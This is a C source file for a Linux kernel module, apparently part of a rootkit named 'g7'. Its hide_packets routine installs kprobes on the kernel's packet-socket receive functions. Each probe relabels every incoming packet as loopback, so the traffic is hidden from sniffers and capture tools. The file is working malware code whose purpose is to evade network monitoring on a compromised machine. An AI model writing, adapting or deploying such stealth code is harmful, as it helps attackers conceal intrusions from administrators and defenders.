#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/skbuff.h>
#include <uapi/linux/if_packet.h>

#include "common.h"
#include "hook.h"

static int g7_packet_rcv(struct kprobe *, struct pt_regs *);
static int g7_tpacket_rcv(struct kprobe *, struct pt_regs *);
static int g7_packet_rcv_spkt(struct kprobe *, struct pt_regs *);
static int g7_fault(struct kprobe *, struct pt_regs *, int);
static void g7_post(struct kprobe *, struct pt_regs *m, unsigned long);

//TODO store in array of kprobes
static struct kprobe p_rcv = {
    .symbol_name    = "packet_rcv",
};

static struct kprobe tp_rcv = {
    .symbol_name    = "tpacket_rcv",
};

static struct kprobe p_rcv_spkt = {
    .symbol_name    = "packet_rcv_spkt",
};

void
hide_packets(void)
{
    p_rcv.pre_handler = g7_packet_rcv;
    p_rcv.post_handler = g7_post;
    p_rcv.fault_handler = g7_fault;

    tp_rcv.pre_handler = g7_tpacket_rcv;
    tp_rcv.post_handler = g7_post;
    tp_rcv.fault_handler = g7_fault;

    p_rcv_spkt.pre_handler = g7_packet_rcv_spkt;
    p_rcv_spkt.post_handler = g7_post;
    p_rcv_spkt.fault_handler = g7_fault;

    if(register_kprobe(&p_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv\n");

    if(register_kprobe(&tp_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe tp_rcv\n");
}

void
unhide_packets(void)
{
    unregister_kprobe(&p_rcv);
    unregister_kprobe(&tp_rcv);
    unregister_kprobe(&p_rcv_spkt);
}

static int
g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
{
    struct sk_buff *skb;
    skb = (struct sk_buff *)pt_regs->di;

    skb->pkt_type = PACKET_LOOPBACK;
    

    return 0;
}

static int
g7_tpacket_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
{
    struct sk_buff *skb;
    skb = (struct sk_buff *)pt_regs->di;

    skb->pkt_type = PACKET_LOOPBACK;

    return 0;
}

static int g7_packet_rcv_spkt(struct kprobe *kp, struct pt_regs *pt_regs)
{
    struct sk_buff *skb;
    skb = (struct sk_buff *)pt_regs->di;

    skb->pkt_type = PACKET_LOOPBACK;

    return 0;
}

static void 
g7_post(struct kprobe *kp, struct pt_regs *pt_regs, unsigned long flags)
{
    return;
}

static int
g7_fault(struct kprobe *kp, struct pt_regs *pt_regs, int trapnr)
{
    return 0;
}